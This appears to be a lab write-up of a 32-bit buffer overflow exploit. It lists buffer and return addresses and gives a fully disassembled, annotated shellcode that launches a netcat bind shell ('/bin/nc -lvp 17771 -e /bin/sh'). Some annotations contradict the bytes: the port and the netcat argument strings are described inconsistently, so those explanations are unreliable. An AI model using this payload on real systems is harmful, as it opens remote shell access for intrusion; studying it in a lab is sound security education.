# Task 3: Reverse Shell Exploitation

## Exploit Details

### Buffer Information
- **Buffer starting address**: `0xffffca71`
- **Buffer offset from frame pointer**: 107 bytes
- **Return address used**: `0xffffc996`
- **First assembly instruction at return address**: `nop` (`0x90`)

## Shellcode Analysis

### Disassembled Shellcode
```assembly
   0:   31 c0                   xor    %eax,%eax         ; Zero out eax
   2:   31 d2                   xor    %edx,%edx         ; Zero out edx
   4:   50                      push   %eax              ; Push NULL terminator
   5:   68 37 37 37 31          push   $0x31373737       ; Push "17771" (port)
   a:   68 2d 76 70 31          push   $0x3170762d       ; Push "-vp1"
   f:   89 e6                   mov    %esp,%esi         ; Save pointer to args in esi
  11:   50                      push   %eax              ; Push NULL terminator
  12:   68 2f 2f 73 68          push   $0x68732f2f       ; Push "//sh"
  17:   68 2f 62 69 6e          push   $0x6e69622f       ; Push "/bin"
  1c:   68 2d 6c 65 2f          push   $0x2f656c2d       ; Push "-le/"
  21:   89 e7                   mov    %esp,%edi         ; Save pointer to args in edi
  23:   50                      push   %eax              ; Push NULL terminator
  24:   68 2f 2f 6e 63          push   $0x636e2f2f       ; Push "//nc"
  29:   68 2f 62 69 6e          push   $0x6e69622f       ; Push "/bin"
  2e:   89 e3                   mov    %esp,%ebx         ; Save pointer to args in ebx
  30:   52                      push   %edx              ; Push NULL
  31:   56                      push   %esi              ; Push port argument pointer
  32:   57                      push   %edi              ; Push shell argument pointer
  33:   53                      push   %ebx              ; Push nc argument pointer
  34:   89 e1                   mov    %esp,%ecx         ; Argument array pointer
  36:   b0 0b                   mov    $0xb,%al          ; syscall number for execve
  38:   cd 80                   int    $0x80             ; Invoke syscall


### Shellcode Execution Flow

1. **Initialization**:
   ```assembly
   0:   31 c0                   xor    %eax,%eax         ; Clear eax (NULL terminator/0x0)
   2:   31 d2                   xor    %edx,%edx         ; Clear edx (NULL for envp)
   ```

2. **Port Argument Construction**:
   ```assembly
   4:   50                      push   %eax              ; Push NULL terminator
   5:   68 37 37 37 31          push   $0x31373737       ; Push "1777" (port number)
   a:   68 2d 76 70 31          push   $0x3170762d       ; Push "-vp1" (netcat flags)
   f:   89 e6                   mov    %esp,%esi         ; Save pointer to "-vp 17771" in esi
   ```

3. **/bin/sh Construction**:
   ```assembly
   11:   50                      push   %eax              ; Push NULL
   12:   68 2f 2f 73 68          push   $0x68732f2f       ; Push "hs//" (little-endian "//sh")
   17:   68 2f 62 69 6e          push   $0x6e69622f       ; Push "nib/" ("/bin")
   1c:   68 2d 6c 65 2f          push   $0x2f656c2d       ; Push "/el-" ("-le/")
   21:   89 e7                   mov    %esp,%edi         ; Save pointer to "-e /bin//sh" in edi
   ```

4. **/bin/nc Construction**:
   ```assembly
   23:   50                      push   %eax              ; Push NULL
   24:   68 2f 2f 6e 63          push   $0x636e2f2f       ; Push "cn//" ("//nc")
   29:   68 2f 62 69 6e          push   $0x6e69622f       ; Push "nib/" ("/bin")
   2e:   89 e3                   mov    %esp,%ebx         ; Save pointer to "/bin//nc" in ebx
   ```

5. **Argument Array Setup**:
   ```assembly
   30:   52                      push   %edx              ; NULL envp terminator
   31:   56                      push   %esi              ; Pointer to "-vp17771" 
   32:   57                      push   %edi              ; Pointer to "-e /bin//sh"
   33:   53                      push   %ebx              ; Pointer to "/bin//nc" 
   34:   89 e1                   mov    %esp,%ecx         ; Argument array pointer -> ecx
   ```

6. **Syscall Execution**:
   ```assembly
   36:   b0 0b                   mov    $0xb,%al          ; execve syscall number (11)
   38:   cd 80                   int    $0x80             ; Invoke syscall
   ```

### Key Observations:
1. **String Construction**: All strings are built on the stack in reverse order (x86 little-endian)
2. **NULL Termination**: Each argument array element is NULL-terminated
3. **Syscall Preparation**:
   - `ebx`: Points to "/bin/nc" (filename)
   - `ecx`: Points to ["/bin/nc", "-e", "/bin/sh", "-vp17771", NULL] 
   - `edx`: NULL (empty environment)
4. **Netcat Command Equivalent**: The shellcode executes:
   ```bash
   /bin/nc -lvp 17771 -e /bin/sh
   ```

This shellcode avoids NULL bytes (except intentional terminators) and uses position-independent stack construction to work reliably in buffer overflow exploits. The chained `mov` instructions preserve argument pointers across stack operations.